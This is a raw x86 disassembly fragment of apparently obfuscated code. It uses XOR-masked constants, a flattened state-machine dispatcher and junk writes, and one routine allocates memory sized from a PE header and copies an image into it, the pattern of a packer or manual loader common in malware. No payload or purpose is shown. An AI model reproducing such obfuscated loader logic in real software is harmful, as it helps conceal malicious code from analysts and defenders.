  4277d0:	xor    ecx,edi
  4277d2:	lea    ecx,[ecx+edx*1+0x3272f3]
  4277d9:	cmp    eax,ecx
  4277db:	jae    0x427b8c
  4277e1:	mov    eax,DWORD PTR [ebp+0x8]
  4277e4:	xor    eax,edi
  4277e6:	add    eax,ebx
  4277e8:	mov    DWORD PTR [ebp+0x18],eax
  4277eb:	mov    eax,DWORD PTR [ebp+0x1c]
  4277ee:	add    eax,DWORD PTR [ebp-0x1c]
  4277f1:	mov    DWORD PTR [ebp-0x4],eax
  4277f4:	push   DWORD PTR [ebp-0x4]
  4277f7:	mov    esi,DWORD PTR [ebp-0x1c]
  4277fa:	mov    ecx,DWORD PTR [ebp+0x10]
  4277fd:	call   0x42694d
  427802:	mov    DWORD PTR [ebp+0xc],eax
  427805:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  42780c:	mov    eax,DWORD PTR [ebp-0x18]
  42780f:	xor    eax,edi
  427811:	lea    ecx,[ebp-0x40]
  427814:	add    eax,ebx
  427816:	push   ecx
  427817:	call   0x426ee1
  42781c:	mov    eax,DWORD PTR [ebp+0xc]
  42781f:	test   eax,eax
  427821:	je     0x427871
  427823:	mov    eax,DWORD PTR [ebp-0x18]
  427826:	xor    eax,edi
  427828:	add    eax,ebx
  42782a:	push   eax
  42782b:	push   DWORD PTR [ebp+0xc]
  42782e:	lea    eax,[ebp-0x40]
  427831:	push   eax
  427832:	call   0x426dd7
  427837:	mov    eax,DWORD PTR [ebp-0x4]
  42783a:	mov    DWORD PTR [ebp-0x18],eax
  42783d:	mov    eax,DWORD PTR [ebp-0x18]
  427840:	mov    ecx,DWORD PTR [ebp-0x1c]
  427843:	sub    eax,ecx
  427845:	mov    DWORD PTR [ebp-0x18],eax
  427848:	mov    eax,DWORD PTR [ebp+0xc]
  42784b:	mov    ecx,DWORD PTR [ebp+0xc]
  42784e:	mov    eax,DWORD PTR [eax+0x10]
  427851:	add    eax,DWORD PTR [ecx+0xc]
  427854:	mov    ecx,DWORD PTR [ebp-0x18]
  427857:	cmp    ecx,eax
  427859:	jb     0x427871
  42785b:	mov    eax,DWORD PTR [ebp+0xc]
  42785e:	mov    eax,DWORD PTR [eax+0xc]
  427861:	mov    ecx,DWORD PTR [ebp+0xc]
  427864:	add    eax,DWORD PTR [ecx+0x8]
  427867:	mov    ecx,DWORD PTR [ebp-0x18]
  42786a:	sub    eax,ecx
  42786c:	jmp    0x427b5f
  427871:	push   0xc
  427873:	push   DWORD PTR [ebp-0x4]
  427876:	lea    eax,[ebp-0x4c]
  427879:	push   eax
  42787a:	call   0x426dd7
  42787f:	mov    eax,0xf89c85a1
  427884:	mov    DWORD PTR [ebp-0x2c],eax
  427887:	mov    DWORD PTR [ebp-0x30],0xf89c85a2
  42788e:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  427895:	mov    DWORD PTR [ebp-0x38],0xf89c85bc
  42789c:	lea    ecx,[ebp-0x2c]
  42789f:	mov    DWORD PTR [ebp-0xc],ecx
  4278a2:	lea    ecx,[ebp-0x30]
  4278a5:	mov    DWORD PTR [ebp-0x10],ecx
  4278a8:	lea    ecx,[ebp-0x34]
  4278ab:	mov    DWORD PTR [ebp+0xc],ecx
  4278ae:	lea    ecx,[ebp-0x38]
  4278b1:	mov    DWORD PTR [ebp-0x14],ecx
  4278b4:	mov    ecx,DWORD PTR [ebp+0x8]
  4278b7:	xor    ecx,edi
  4278b9:	add    ecx,ebx
  4278bb:	mov    DWORD PTR [ebp-0x18],ecx
  4278be:	jmp    0x427aba
  4278c3:	cmp    eax,0xf89c85a3
  4278c8:	je     0x427acc
  4278ce:	mov    ecx,DWORD PTR [ebp-0x8]
  4278d1:	xor    ecx,edi
  4278d3:	mov    esi,eax
  4278d5:	add    ecx,ebx
  4278d7:	mov    DWORD PTR [ebp+0x18],ecx
  4278da:	mov    eax,DWORD PTR [ebp-0x18]
  4278dd:	xor    esi,edi
  4278df:	lea    eax,[eax+esi*1+0x3272f3]
  4278e6:	mov    DWORD PTR [ebp-0x18],eax
  4278e9:	mov    eax,DWORD PTR [ebp-0x8]
  4278ec:	mov    ecx,DWORD PTR [ebp-0x18]
  4278ef:	xor    eax,edi
  4278f1:	add    eax,ebx
  4278f3:	cmp    ecx,eax
  4278f5:	jne    0x42790a
  4278f7:	mov    eax,DWORD PTR [ebp+0x8]
  4278fa:	xor    eax,edi
  4278fc:	add    eax,ebx
  4278fe:	push   eax
  4278ff:	push   0xc
  427901:	lea    eax,[ebp-0x4c]
  427904:	push   eax
  427905:	call   0x4273bd
  42790a:	mov    eax,DWORD PTR [ebp-0xc]
  42790d:	mov    eax,DWORD PTR [eax]
  42790f:	xor    eax,edi
  427911:	mov    al,BYTE PTR [ebp+eax*1+0x3272a7]
  427918:	mov    ecx,DWORD PTR [ebp+0x8]
  42791b:	xor    ecx,edi
  42791d:	movzx  eax,al
  427920:	add    ecx,ebx
  427922:	cmp    eax,ecx
  427924:	je     0x427aa2
  42792a:	mov    eax,DWORD PTR [ebp-0x10]
  42792d:	mov    eax,DWORD PTR [eax]
  42792f:	xor    eax,edi
  427931:	mov    al,BYTE PTR [ebp+eax*1+0x3272a7]
  427938:	mov    ecx,DWORD PTR [ebp+0x8]
  42793b:	xor    ecx,edi
  42793d:	movzx  eax,al
  427940:	add    ecx,ebx
  427942:	cmp    eax,ecx
  427944:	je     0x427aa2
  42794a:	mov    eax,DWORD PTR [ebp+0xc]
  42794d:	mov    eax,DWORD PTR [eax]
  42794f:	xor    eax,edi
  427951:	mov    al,BYTE PTR [ebp+eax*1+0x3272a7]
  427958:	mov    ecx,DWORD PTR [ebp+0x8]
  42795b:	xor    ecx,edi
  42795d:	movzx  eax,al
  427960:	add    ecx,ebx
  427962:	cmp    eax,ecx
  427964:	je     0x427aa2
  42796a:	mov    eax,DWORD PTR [ebp-0x14]
  42796d:	mov    eax,DWORD PTR [eax]
  42796f:	xor    eax,edi
  427971:	mov    al,BYTE PTR [ebp+eax*1+0x3272a7]
  427978:	mov    ecx,DWORD PTR [ebp+0x8]
  42797b:	xor    ecx,edi
  42797d:	movzx  eax,al
  427980:	add    ecx,ebx
  427982:	cmp    eax,ecx
  427984:	je     0x427aa2
  42798a:	mov    eax,DWORD PTR [ebp-0x10]
  42798d:	mov    eax,DWORD PTR [eax]
  42798f:	xor    eax,edi
  427991:	mov    al,BYTE PTR [ebp+eax*1+0x3272a7]
  427998:	mov    ecx,DWORD PTR [ebp-0xc]
  42799b:	mov    ecx,DWORD PTR [ecx]
  42799d:	xor    ecx,edi
  42799f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  4279a6:	xor    al,cl
  4279a8:	mov    ecx,DWORD PTR [ebp+0xc]
  4279ab:	mov    ecx,DWORD PTR [ecx]
  4279ad:	xor    ecx,edi
  4279af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  4279b6:	or     al,cl
  4279b8:	mov    ecx,DWORD PTR [ebp-0xc]
  4279bb:	mov    ecx,DWORD PTR [ecx]
  4279bd:	xor    ecx,edi
  4279bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ab]
  4279c6:	cmp    cl,al
  4279c8:	jne    0x427aa2
  4279ce:	mov    eax,DWORD PTR [ebp+0xc]
  4279d1:	mov    eax,DWORD PTR [eax]
  4279d3:	xor    eax,edi
  4279d5:	mov    al,BYTE PTR [ebp+eax*1+0x3272a7]
  4279dc:	mov    ecx,DWORD PTR [ebp-0x10]
  4279df:	mov    ecx,DWORD PTR [ecx]
  4279e1:	xor    ecx,edi
  4279e3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  4279ea:	xor    al,cl
  4279ec:	mov    ecx,DWORD PTR [ebp-0x14]
  4279ef:	mov    ecx,DWORD PTR [ecx]
  4279f1:	xor    ecx,edi
  4279f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  4279fa:	or     al,cl
  4279fc:	mov    ecx,DWORD PTR [ebp-0x10]
  4279ff:	mov    ecx,DWORD PTR [ecx]
  427a01:	xor    ecx,edi
  427a03:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ab]
  427a0a:	cmp    cl,al
  427a0c:	jne    0x427aa2
  427a12:	mov    eax,DWORD PTR [ebp-0x14]
  427a15:	mov    eax,DWORD PTR [eax]
  427a17:	xor    eax,edi
  427a19:	mov    al,BYTE PTR [ebp+eax*1+0x3272a7]
  427a20:	mov    ecx,DWORD PTR [ebp+0xc]
  427a23:	mov    ecx,DWORD PTR [ecx]
  427a25:	xor    ecx,edi
  427a27:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  427a2e:	xor    al,cl
  427a30:	mov    ecx,DWORD PTR [ebp-0xc]
  427a33:	mov    ecx,DWORD PTR [ecx]
  427a35:	xor    ecx,edi
  427a37:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  427a3e:	or     al,cl
  427a40:	mov    ecx,DWORD PTR [ebp+0xc]
  427a43:	mov    ecx,DWORD PTR [ecx]
  427a45:	xor    ecx,edi
  427a47:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ab]
  427a4e:	cmp    cl,al
  427a50:	jne    0x427aa2
  427a52:	mov    eax,DWORD PTR [ebp-0x14]
  427a55:	mov    eax,DWORD PTR [eax]
  427a57:	xor    eax,edi
  427a59:	mov    al,BYTE PTR [ebp+eax*1+0x3272a7]
  427a60:	mov    ecx,DWORD PTR [ebp-0xc]
  427a63:	mov    ecx,DWORD PTR [ecx]
  427a65:	xor    ecx,edi
  427a67:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  427a6e:	xor    al,cl
  427a70:	mov    ecx,DWORD PTR [ebp-0x10]
  427a73:	mov    ecx,DWORD PTR [ecx]
  427a75:	xor    ecx,edi
  427a77:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  427a7e:	or     al,cl
  427a80:	mov    ecx,DWORD PTR [ebp-0x14]
  427a83:	mov    ecx,DWORD PTR [ecx]
  427a85:	xor    ecx,edi
  427a87:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ab]
  427a8e:	cmp    cl,al
  427a90:	jne    0x427aa2
  427a92:	lea    eax,[ebp-0x4c]
  427a95:	push   eax
  427a96:	call   0x42755d
  427a9b:	mov    ecx,DWORD PTR [ebp-0x44]
  427a9e:	cmp    eax,ecx
  427aa0:	je     0x427aac
  427aa2:	mov    eax,DWORD PTR [ebp+0x8]
  427aa5:	xor    eax,edi
  427aa7:	add    eax,ebx
  427aa9:	mov    DWORD PTR [ebp+0x18],eax
  427aac:	mov    eax,DWORD PTR [ebp-0x8]
  427aaf:	xor    eax,edi
  427ab1:	lea    eax,[eax+esi*1+0x3272f3]
  427ab8:	xor    eax,edi
  427aba:	mov    ecx,DWORD PTR [ebp+0x8]
  427abd:	mov    edx,DWORD PTR [ebp+0x18]
  427ac0:	xor    ecx,edi
  427ac2:	add    ecx,ebx
  427ac4:	cmp    edx,ecx
  427ac6:	je     0x4278c3
  427acc:	mov    eax,DWORD PTR [ebp+0x8]
  427acf:	mov    ecx,DWORD PTR [ebp+0x18]
  427ad2:	xor    eax,edi
  427ad4:	add    eax,ebx
  427ad6:	cmp    ecx,eax
  427ad8:	jne    0x427aeb
  427ada:	mov    eax,DWORD PTR [ebp-0x8]
  427add:	mov    ecx,DWORD PTR [ebp+0x1c]
  427ae0:	xor    eax,edi
  427ae2:	lea    eax,[eax+ecx*1+0x3272f3]
  427ae9:	jmp    0x427b62
  427aeb:	push   0x18
  427aed:	push   DWORD PTR [ebp-0x4]
  427af0:	lea    eax,[ebp-0x64]
  427af3:	push   eax
  427af4:	call   0x426dd7
  427af9:	mov    eax,DWORD PTR [ebp+0x8]
  427afc:	mov    ecx,DWORD PTR [ebp-0x18]
  427aff:	xor    eax,edi
  427b01:	add    eax,ebx
  427b03:	cmp    eax,ecx
  427b05:	je     0x427b1a
  427b07:	mov    eax,DWORD PTR [ebp+0x8]
  427b0a:	xor    eax,edi
  427b0c:	add    eax,ebx
  427b0e:	push   eax
  427b0f:	push   0x18
  427b11:	lea    eax,[ebp-0x64]
  427b14:	push   eax
  427b15:	call   0x4273bd
  427b1a:	mov    eax,DWORD PTR [ebp-0x4]
  427b1d:	add    eax,0x18
  427b20:	mov    DWORD PTR [ebp+0x18],eax
  427b23:	push   DWORD PTR [ebp-0x50]
  427b26:	push   DWORD PTR [ebp+0x18]
  427b29:	mov    eax,DWORD PTR [ebp-0x54]
  427b2c:	add    eax,DWORD PTR [ebp-0x20]
  427b2f:	push   eax
  427b30:	call   0x426dd7
  427b35:	mov    eax,DWORD PTR [ebp+0x8]
  427b38:	mov    ecx,DWORD PTR [ebp-0x18]
  427b3b:	xor    eax,edi
  427b3d:	add    eax,ebx
  427b3f:	cmp    eax,ecx
  427b41:	je     0x427b54
  427b43:	push   0x0
  427b45:	push   DWORD PTR [ebp-0x50]
  427b48:	mov    eax,DWORD PTR [ebp-0x54]
  427b4b:	add    eax,DWORD PTR [ebp-0x20]
  427b4e:	push   eax
  427b4f:	call   0x4273bd
  427b54:	mov    eax,DWORD PTR [ebp-0x24]
  427b57:	mov    ecx,DWORD PTR [ebp-0x50]
  427b5a:	add    DWORD PTR [eax],ecx
  427b5c:	mov    eax,DWORD PTR [ebp-0x50]
  427b5f:	add    eax,DWORD PTR [ebp+0x1c]
  427b62:	mov    DWORD PTR [ebp+0x1c],eax
  427b65:	mov    eax,DWORD PTR [ebp-0x8]
  427b68:	mov    ecx,DWORD PTR [ebp+0x1c]
  427b6b:	xor    eax,edi
  427b6d:	add    eax,ebx
  427b6f:	imul   eax,ecx
  427b72:	mov    ecx,DWORD PTR [ebp+0x8]
  427b75:	mov    edx,DWORD PTR [ebp-0x28]
  427b78:	xor    ecx,edi
  427b7a:	lea    ecx,[ecx+edx*1+0x3272f3]
  427b81:	cmp    eax,ecx
  427b83:	jb     0x4277e1
  427b89:	mov    esi,DWORD PTR [ebp+0x14]
  427b8c:	mov    eax,DWORD PTR [ebp-0x20]
  427b8f:	mov    DWORD PTR [esi],eax
  427b91:	jmp    0x427bd8
  427b93:	mov    ecx,DWORD PTR [ebp+0x8]
  427b96:	mov    edx,DWORD PTR [ebp+0xc]
  427b99:	xor    ecx,edi
  427b9b:	xor    edx,edi
  427b9d:	add    ecx,ebx
  427b9f:	add    edx,ebx
  427ba1:	cmp    ecx,edx
  427ba3:	jne    0x427bb7
  427ba5:	mov    eax,ds:0x7f642dd8
  427baa:	imul   eax,eax,0x9f15fccf
  427bb0:	mov    ds:0x7f642dd8,eax
  427bb5:	jmp    0x427bd8
  427bb7:	mov    ecx,DWORD PTR [ebp+0x8]
  427bba:	xor    ecx,edi
  427bbc:	add    ecx,ebx
  427bbe:	cmp    eax,ecx
  427bc0:	je     0x427bce
  427bc2:	sub    DWORD PTR ds:0xf861e38,0x709beac8
  427bcc:	jmp    0x427bd8
  427bce:	and    DWORD PTR ds:0x3343fad8,0x5265ec3f
  427bd8:	pop    edi
  427bd9:	pop    esi
  427bda:	pop    ebx
  427bdb:	leave  
  427bdc:	ret    0x18
  427bdf:	push   ebp
  427be0:	mov    ebp,esp
  427be2:	and    esp,0xfffffff8
  427be5:	mov    eax,DWORD PTR [ebp+0x20]
  427be8:	sub    esp,0x14
  427beb:	push   ebx
  427bec:	mov    ebx,DWORD PTR [ebp+0x14]
  427bef:	push   esi
  427bf0:	push   edi
  427bf1:	cmp    eax,0xf89c85a1
  427bf6:	jne    0x427c02
  427bf8:	push   0xf89c85a2
  427bfd:	jmp    0x427d34
  427c02:	mov    eax,DWORD PTR [ebp+0x20]
  427c05:	cmp    eax,0xf89c85a2
  427c0a:	jne    0x427c16
  427c0c:	push   0xf89c85a3
  427c11:	jmp    0x427d34
  427c16:	mov    eax,DWORD PTR [ebp+0x20]
  427c19:	cmp    eax,0xf89c85a3
  427c1e:	jne    0x427c2a
  427c20:	push   0xf89c85bc
  427c25:	jmp    0x427d34
  427c2a:	mov    eax,DWORD PTR [ebp+0x20]
  427c2d:	cmp    eax,0xf89c85bc
  427c32:	jne    0x427c3e
  427c34:	push   0xf89c85bd
  427c39:	jmp    0x427d34
  427c3e:	mov    ecx,DWORD PTR [ebp+0x20]
  427c41:	mov    eax,0xf89c85b8
  427c46:	cmp    ecx,eax
  427c48:	jne    0x427d04
  427c4e:	mov    eax,DWORD PTR [ebp+0x10]
  427c51:	mov    DWORD PTR [esp+0xc],eax
  427c55:	mov    eax,DWORD PTR [ebp+0x18]
  427c58:	mov    DWORD PTR [esp+0x14],eax
  427c5c:	mov    eax,DWORD PTR [ebp+0xc]
  427c5f:	mov    DWORD PTR [esp+0x18],eax
  427c63:	mov    eax,DWORD PTR [ebp+0x8]
  427c66:	mov    DWORD PTR [esp+0x10],eax
  427c6a:	mov    eax,DWORD PTR [esp+0x10]
  427c6e:	mov    ecx,DWORD PTR [esp+0x14]
  427c72:	mov    edi,0x75108ac
  427c77:	xor    eax,edi
  427c79:	mov    esi,0x3272f3
  427c7e:	add    eax,esi
  427c80:	mov    DWORD PTR [ecx],eax
  427c82:	mov    eax,DWORD PTR [esp+0xc]
  427c86:	mov    eax,DWORD PTR [eax+0x194]
  427c8c:	mov    ecx,DWORD PTR [eax]
  427c8e:	mov    eax,DWORD PTR [esp+0xc]
  427c92:	mov    eax,DWORD PTR [eax+0x194]
  427c98:	mov    eax,DWORD PTR [eax]
  427c9a:	add    eax,DWORD PTR [ecx+0x3c]
  427c9d:	mov    ecx,DWORD PTR [esp+0xc]
  427ca1:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427ca7:	mov    ecx,DWORD PTR [ecx+0x14]
  427caa:	push   0x4
  427cac:	push   0x3000
  427cb1:	push   DWORD PTR [eax+0x50]
  427cb4:	push   0x0
  427cb6:	call   ecx
  427cb8:	mov    DWORD PTR [ebx],eax
  427cba:	mov    eax,DWORD PTR [esp+0x10]
  427cbe:	push   DWORD PTR [esp+0xc]
  427cc2:	xor    eax,edi
  427cc4:	add    eax,esi
  427cc6:	mov    DWORD PTR [esp+0x20],eax
  427cca:	lea    eax,[esp+0x20]
  427cce:	push   eax
  427ccf:	push   ebx
  427cd0:	push   DWORD PTR [esp+0x20]
  427cd4:	push   DWORD PTR [esp+0x28]
  427cd8:	push   DWORD PTR [esp+0x24]
  427cdc:	call   0x4276a1
  427ce1:	mov    eax,DWORD PTR [esp+0x10]
  427ce5:	mov    ecx,DWORD PTR [ebx]
  427ce7:	xor    eax,edi
  427ce9:	add    eax,esi
  427ceb:	cmp    ecx,eax
  427ced:	je     0x427d4b
  427cef:	mov    eax,DWORD PTR [esp+0x18]
  427cf3:	mov    ecx,DWORD PTR [esp+0x14]
  427cf7:	xor    eax,edi
  427cf9:	add    eax,esi
  427cfb:	imul   eax,DWORD PTR [esp+0x1c]
  427d00:	mov    DWORD PTR [ecx],eax
  427d02:	jmp    0x427d4b
  427d04:	mov    ecx,DWORD PTR [ebp+0x20]
  427d07:	cmp    ecx,0xf89c85bd
  427d0d:	jne    0x427d16
  427d0f:	push   0xf89c85be
  427d14:	jmp    0x427d34
  427d16:	mov    ecx,DWORD PTR [ebp+0x20]
  427d19:	cmp    ecx,0xf89c85be
  427d1f:	jne    0x427d28
  427d21:	push   0xf89c85bf
  427d26:	jmp    0x427d34
  427d28:	mov    ecx,DWORD PTR [ebp+0x20]
  427d2b:	cmp    ecx,0xf89c85bf
  427d31:	jne    0x427d4b
  427d33:	push   eax
  427d34:	push   DWORD PTR [ebp+0x1c]
  427d37:	push   DWORD PTR [ebp+0x18]
  427d3a:	push   ebx
  427d3b:	push   DWORD PTR [ebp+0x10]
  427d3e:	push   DWORD PTR [ebp+0xc]
  427d41:	push   DWORD PTR [ebp+0x8]
  427d44:	call   0x427bdf
  427d49:	mov    DWORD PTR [ebx],eax
  427d4b:	mov    eax,DWORD PTR [ebx]
  427d4d:	pop    edi
  427d4e:	pop    esi
  427d4f:	pop    ebx
  427d50:	mov    esp,ebp
  427d52:	pop    ebp
  427d53:	ret    0x1c
  427d56:	push   ebp
  427d57:	mov    ebp,esp
  427d59:	sub    esp,0xc
  427d5c:	mov    eax,0xf89c85a1
  427d61:	mov    DWORD PTR [ebp-0x8],eax
  427d64:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  427d6b:	mov    ecx,DWORD PTR [ebp-0x8]
  427d6e:	xor    ecx,0x75108ac
  427d74:	add    ecx,0x3272f3
  427d7a:	mov    DWORD PTR [ebp-0x4],ecx
  427d7d:	mov    ecx,DWORD PTR [ebp+0xc]
  427d80:	push   eax
  427d81:	mov    DWORD PTR [ebp+0xc],ecx
  427d84:	push   DWORD PTR [ebp+0xc]
  427d87:	lea    eax,[ebp-0x4]
  427d8a:	push   DWORD PTR [ebp+0x8]
  427d8d:	push   eax
  427d8e:	push   DWORD PTR [ebp+0xc]
  427d91:	push   DWORD PTR [ebp-0xc]
  427d94:	push   DWORD PTR [ebp-0x8]
  427d97:	call   0x427bdf
  427d9c:	mov    DWORD PTR [ebp-0x4],eax
  427d9f:	mov    eax,DWORD PTR [ebp-0x4]
  427da2:	leave  
  427da3:	ret    0x8
